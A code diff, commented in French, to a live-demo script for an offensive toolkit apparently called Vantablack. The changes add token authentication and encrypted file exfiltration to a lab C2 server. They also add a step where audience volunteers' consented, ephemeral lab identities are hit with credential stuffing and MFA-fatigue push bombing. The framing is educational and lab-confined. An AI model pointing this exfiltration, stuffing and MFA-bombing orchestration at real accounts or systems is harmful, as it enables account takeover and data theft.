@@ -32,6 +32,7 @@ from __future__ import annotations
 import argparse
 import hashlib
 import json
+import os
 import platform
 import socket
 import subprocess
@@ -62,7 +63,7 @@ def info(msg: str) -> None:
 
 
 def banner(n: int, title: str) -> None:
-    print(f"\n{BOLD}{CYAN}[ÉTAPE {n}/6] {title}{NC}")
+    print(f"\n{BOLD}{CYAN}[ÉTAPE {n}/7] {title}{NC}")
 
 
 def free_port() -> int:
@@ -85,6 +86,21 @@ def wait_tcp(port: int, timeout_s: float = 8.0) -> bool:
 def http_json(url: str, timeout: float = 5.0) -> dict:
     with urllib.request.urlopen(url, timeout=timeout) as r:
         return json.loads(r.read())
+
+
+def _lan_ip() -> str:
+    """IP LAN de cette machine (pour l'URL que les téléphones scannent).
+
+    UDP connect sans envoi de paquet : fonctionne hors ligne, fallback local.
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except OSError:
+        return "127.0.0.1"
+    finally:
+        s.close()
 
 
 # ---------------------------------------------------------------------------
@@ -121,6 +137,7 @@ class LabC2:
 
     def __init__(self, base_url: str | None = None) -> None:
         self.external = base_url is not None
+        self.token = os.environ.get("VANTABLACK_C2_TOKEN", "")
         if self.external:
             base = base_url.rstrip("/")
             if not base.startswith(("http://", "https://")):
@@ -129,10 +146,10 @@ class LabC2:
             self.proc = None
         else:
             self.port = free_port()
-            import os
             env = dict(os.environ,
                        PATH="/usr/bin:/bin",
                        LABC2_PORT=str(self.port),
+                       LABC2_TOKEN=self.token,
                        LABC2_ACCEPT_USERS=LABC2_USERS,
                        LABC2_LOCK_USERS=LABC2_LOCKED,
                        LABC2_ACCEPT_AFTER_N="3")
@@ -234,7 +251,9 @@ def step_exfil(c2: LabC2) -> bool:
     src.write_bytes(secret)
     info(f"secret de {len(secret)} octets écrit")
     ex = DataExfiltrator(destination=f"{c2.base}/exfil",
-                         output_path=str(DEMO_DIR / "demo.bin.enc"))
+                         output_path=str(DEMO_DIR / "demo.bin.enc"),
+                         headers=({"Authorization": f"Bearer {c2.token}"}
+                                  if c2.token else None))
     ex.exfil_files([StagedFile(path=str(src), category="Lab",
                                sensitivity_score=0.99)])
     ok("chiffré AES-256-GCM (clé de session 256 bits, nonce 96 bits)")
@@ -264,6 +283,19 @@ def step_exfil(c2: LabC2) -> bool:
         fail("déchiffrement différent de l'original")
         return False
     ok("déchiffrement côté C2 : octets identiques à l'original")
+    try:
+        req = urllib.request.Request(
+            f"{c2.base}/announce",
+            data=json.dumps({"text": (
+                f"DÉCHIFFREMENT EN DIRECT : session {ex.session_id} — "
+                f"{len(secret)} octets récupérés, SHA-256 vérifié")}).encode(),
+            headers={"Content-Type": "application/json",
+                     **({"Authorization": f"Bearer {c2.token}"}
+                        if c2.token else {})})
+        urllib.request.urlopen(req, timeout=5)
+        ok("annonce « déchiffrement » poussée sur l'écran de projection")
+    except OSError:
+        info("annonce non poussée (dashboard indisponible)")
     return True
 
 
@@ -273,7 +305,9 @@ def step_mfa(c2: LabC2) -> bool:
     camp = eng.start_campaign(
         target=MFATarget.MICROSOFT_ENTRA, username="victim@corp.local",
         interval_seconds=0.05, max_attempts=25,
-        push_url=f"{c2.base}/push", real=True)
+        push_url=f"{c2.base}/push", real=True,
+        push_headers=({"Authorization": f"Bearer {c2.token}"}
+                      if c2.token else None))
     t0 = time.time()
     while camp.accepted_attempt is None and time.time() - t0 < 20:
         time.sleep(0.05)
@@ -331,6 +365,65 @@ def step_ws() -> bool:
         return True
     finally:
         echo.terminate()
+
+
+def step_volunteers(c2: LabC2) -> bool:
+    """Le public participe : chaque volontaire a reçu une identité de labo
+    éphémère (QR + consentement). On attaque CES identités, en direct —
+    aucun compte réel, aucune machine réelle."""
+    from attack.credential_stuffing.sprayer import (CredentialPair,
+                                                    CredentialStuffingEngine,
+                                                    RealLoginTarget)
+    vols = http_json(f"{c2.base}/volunteers").get("volunteers", [])
+    if not vols:
+        info("aucun volontaire inscrit — montrez le QR /join et relancez "
+             "cette étape (la démo reste valide sans eux)")
+        return True
+    ok(f"{len(vols)} volontaire(s) avec consentement enregistré : "
+       + ", ".join(v["pseudo"] for v in vols))
+    target = RealLoginTarget(url=f"{c2.base}/ingest", method="json",
+                             user_field="user", password_field="password")
+    hdrs = ({"Authorization": f"Bearer {c2.token}"} if c2.token else None)
+    for v in vols:
+        pseudo, lab = v["pseudo"], v["lab_user"]
+        pwd = f"Demo-{pseudo}-2026!"
+        eng = CredentialStuffingEngine(
+            real=True, real_login_target=target, proxy_pool=None,
+            output_dir=str(DEMO_DIR / "stuffing"))
+        rep = eng.run_credential_stuffing(
+            [CredentialPair(username=lab, password=pwd)], simulated=True)
+        code = 200 if rep.successful_logins else (
+            423 if rep.locked_accounts else 401)
+        if code == 200:
+            ok(f"identité de labo de {pseudo} COMPROMISE en direct "
+               f"(HTTP 200, mot de passe : {pwd}) — visible sur le dashboard")
+        elif code == 423:
+            ok(f"compte de labo de {pseudo} volontairement verrouillé "
+               f"(HTTP 423) — visible sur le dashboard")
+        else:
+            fail(f"{pseudo} : code inattendu {code}")
+            return False
+    # Push MFA sur la première identité volontaire : c'est le serveur qui
+    # joue le rôle du « téléphone » du volontaire (simulateur d'acceptation).
+    from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget
+    first = vols[0]
+    eng = MFABombingEngine(output_dir=str(DEMO_DIR / "mfa"))
+    camp = eng.start_campaign(
+        target=MFATarget.MICROSOFT_ENTRA, username=first["lab_user"],
+        interval_seconds=0.05, max_attempts=10,
+        push_url=f"{c2.base}/push", real=True, push_headers=hdrs)
+    t0 = time.time()
+    while camp.accepted_attempt is None and time.time() - t0 < 20:
+        time.sleep(0.05)
+    camp.stop_event.set()
+    time.sleep(0.2)
+    a = camp.accepted_attempt
+    if a is None:
+        fail(f"push MFA du volontaire {first['pseudo']} jamais accepté")
+        return False
+    ok(f"MFA fatigue sur l'identité de {first['pseudo']} : ALLOW au push "
+       f"#{a.push_n} (son « téléphone de labo » a accepté) — sur le dashboard")
+    return True
 
 
 def _read_real_hosts() -> list[str]:
@@ -431,10 +524,47 @@ def main() -> int:
             fail(f"{c2.base} répond mais n'est pas un C2 Vantablack")
             return 1
         mode = "DISTANT (autre machine du réseau)" if c2.external else "LOCAL"
-        results.append(("C2 de labo", True))
         ok(f"C2 réel {mode} : {c2.base}")
         ok(f"health : accept={hp['accept_users']} lock={hp['lock_users']} "
            f"allow_dès_le_push_n°{hp['accept_after_n']}")
+        # Pre-flight : jamais de 401 mystère au milieu du show. Si le C2
+        # n'accepte pas les identités de test, on échoue TOUT DE SUITE avec
+        # la commande exacte à lancer sur la machine du C2.
+        need_accept = set(LABC2_USERS.split(","))
+        need_lock = {LABC2_LOCKED}
+        have_accept = set(hp.get("accept_users") or [])
+        have_lock = set(hp.get("lock_users") or [])
+        missing = sorted((need_accept - have_accept)
+                         | (need_lock - have_lock))
+        if missing:
+            fail(f"le C2 n'accepte pas ces identités de test : {missing}")
+            port = c2.base.rsplit(":", 1)[1]
+            cmd = (f"LABC2_BIND=0.0.0.0 "
+                   f"LABC2_ACCEPT_USERS='{LABC2_USERS}' "
+                   f"LABC2_LOCK_USERS='{LABC2_LOCKED}' "
+                   f"LABC2_ACCEPT_AFTER_N=3 "
+                   f"python3 c2/lab_c2_server.py {port}")
+            print(f"\n{YELLOW}Sur la machine du C2, relancez exactement :"
+                  f"{NC}\n  {cmd}\n")
+            return 1
+        results.append(("C2 de labo", True))
+        # URLs de projection + QR pour les téléphones du public
+        ip = _lan_ip() if not c2.external else c2.base.split("//")[1].split(":")[0]
+        shown_ip = ip if not c2.external else ip
+        base_lan = f"http://{shown_ip}:{c2.base.rsplit(':', 1)[1]}"
+        dash = f"{base_lan}/dashboard"
+        join = f"{base_lan}/join"
+        ok(f"ÉCRAN DE PROJECTION → ouvrez : {dash}")
+        try:
+            import qrcode
+            qr = qrcode.QRCode(border=1)
+            qr.add_data(join)
+            qr.print_ascii(invert=True)
+            ok(f"les volontaires scannent ce QR (ou {join}) et cochent "
+               f"le consentement depuis leur téléphone")
+        except ImportError:
+            info(f"volontaires : affichez {join} (pip install qrcode pour "
+                 f"le QR)")
 
         banner(2, "CREDENTIAL STUFFING RÉEL — POST httpx vers le C2")
         results.append(("Stuffing", step_stuffing(c2)))
@@ -450,6 +580,9 @@ def main() -> int:
 
         banner(6, "POST-EX LOCALE RÉELLE — artefacts réels de CETTE machine")
         results.append(("Post-ex locale", step_harvest()))
+
+        banner(7, "VOLONTAIRES DU PUBLIC — identités de labo, consentement")
+        results.append(("Volontaires", step_volunteers(c2)))
 
         if c2 is not None:
             info(f"compteurs côté serveur C2 (delta démo) : "
